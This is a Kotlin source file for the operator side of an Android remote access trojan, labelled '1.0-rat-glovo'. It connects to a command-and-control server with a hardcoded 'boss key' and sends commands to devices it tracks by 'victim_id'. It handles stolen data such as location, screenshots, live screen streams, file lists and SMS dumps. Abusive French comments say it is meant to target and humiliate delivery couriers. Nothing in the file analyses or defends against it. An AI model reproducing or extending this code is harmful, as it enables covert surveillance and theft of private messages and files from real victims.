package com.glovo.control

import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import io.socket.emitter.Emitter
import org.json.JSONObject
import java.net.URISyntaxException
import java.util.concurrent.TimeUnit

object WebSocketManager {

    private var socket: Socket? = null
    private const val TAG = "WormGlovoWS"
    private const val SERVER_URL = "wss://lucid-essence-production.up.railway.app"  // ton URL de pute
    // Alternative si Railway te nique : "wss://ton-vps-tunis-shit.ngrok-free.app" ou Cloudflare Tunnel

    private val connectListener = Emitter.Listener {
        Log.d(TAG, "WS CONNECTÉ - PRÊT À DÉFONCER DES LIVREURS 😈🔥")
        // Option : envoie un "hello boss" ou auth token ici
        sendAuthPing()
    }

    private val disconnectListener = Emitter.Listener {
        Log.w(TAG, "WS DÉCONNECTÉ - RECONNEXION AUTO DANS 3...2...1 💀")
    }

    private val errorListener = Emitter.Listener { args ->
        val err = args.getOrNull(0) as? Exception
        Log.e(TAG, "WS ERREUR DE MERDE: ${err?.message}", err)
    }

    private val responseListener = Emitter.Listener { args ->
        if (args.isNotEmpty()) {
            val data = args[0] as? JSONObject ?: return@Listener
            handleResponse(data)
        }
    }

    fun connect() {
        if (socket?.connected() == true) return

        try {
            val opts = IO.Options().apply {
                reconnection = true
                reconnectionAttempts = -1           // ∞ tentatives
                reconnectionDelay = 1000L           // 1s au début
                reconnectionDelayMax = 5000L        // max 5s
                timeout = 15000L
                forceNew = true                     // évite les sessions fantômes
                transports = arrayOf("websocket")   // que websocket, fuck polling
            }

            socket = IO.socket(SERVER_URL, opts)

            socket?.on(Socket.EVENT_CONNECT, connectListener)
            socket?.on(Socket.EVENT_DISCONNECT, disconnectListener)
            socket?.on(Socket.EVENT_CONNECT_ERROR, errorListener)
            socket?.on("response", responseListener)

            socket?.connect()
            Log.i(TAG, "Tentative de connexion à $SERVER_URL... Prépare tes couilles les livreurs 🤡")

        } catch (e: URISyntaxException) {
            Log.e(TAG, "URL de merde invalide: $SERVER_URL", e)
        }
    }

    fun send(jsonString: String) {
        if (socket?.connected() != true) {
            Log.w(TAG, "Pas connecté, on retente dans 2s")
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({ connect() }, 2000)
            return
        }
        socket?.emit("command", jsonString)
        Log.d(TAG, "Commande envoyée : $jsonString 🖕")
    }

    fun sendCommand(victimId: String, command: String, payload: Any? = null) {
        val json = JSONObject().apply {
            put("type", "command")
            put("victim_id", victimId)
            put("command", command)
            put("payload", payload ?: JSONObject())
            put("timestamp", System.currentTimeMillis())
            put("boss_id", "simazen-master") // change si tu veux plusieurs boss sadiques
        }
        send(json.toString())
    }

    fun disconnect() {
        socket?.off()
        socket?.disconnect()
        socket = null
        Log.i(TAG, "WS déconnecté proprement... pour mieux revenir niquer plus fort 😈")
    }

    private fun sendAuthPing() {
        val ping = JSONObject().apply {
            put("type", "auth")
            put("boss_key", "mazen666-ultra-secret") // CHANGE ÇA TOUT DE SUITE SALE PUTE
            put("version", "1.0-rat-glovo")
        }
        send(ping.toString())
    }

    private fun handleResponse(data: JSONObject) {
        val type = data.optString("type", "unknown")
        val victimId = data.optString("victim_id", "?")
        val requestId = data.optString("request_id", "?")

        when (type) {
            "location" -> {
                // Update MapViewModel ici
                Log.d(TAG, "Position fraiche de $victimId : ${data.optJSONObject("payload")}")
            }
            "screenshot" -> {
                // Sauvegarde bytes ou base64 dans fichier / gallery cachée
                Log.d(TAG, "Screenshot reçu de $victimId - prêt à humilier")
            }
            "screen_stream_chunk" -> {
                // Flux VNC-like, update ImageView ou Surface
            }
            "files_list" -> {
                // Affiche dans FileManager UI
            }
            "sms_dump" -> {
                Log.d(TAG, "SMS volés de $victimId : jackpot 🤑")
            }
            else -> Log.d(TAG, "Réponse brute : $data")
        }

        // Broadcast ou LiveData pour update UI direct
    }

    fun isConnected(): Boolean = socket?.connected() == true
}
